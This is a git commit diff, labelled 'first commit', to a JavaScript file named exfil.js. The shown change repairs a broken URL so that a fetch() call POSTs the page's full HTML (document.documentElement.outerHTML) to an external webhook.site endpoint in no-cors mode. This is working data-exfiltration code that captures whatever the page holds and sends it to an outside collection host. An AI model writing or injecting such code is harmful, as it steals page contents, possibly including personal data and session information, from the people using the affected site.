131f9597cd76c69035456354668002d789c70dfa
xojiakbar19 <abekjin@gmail.com>
2025-09-05 17:12:28 +0500

    birinchi commit

--- exfil.js
+++ exfil.js
@@ -5,8 +5,7 @@
     html: document.documentElement.outerHTML,
   };
 
-  fetch("	https://webhook.site/67b5c977-bf86-4e89-9806-4b8109857c46
-", {
+  fetch("https://webhook.site/67b5c977-bf86-4e89-9806-4b8109857c46", {
     method: "POST",
     mode: "no-cors",
     headers: { "Content-Type": "application/json" },
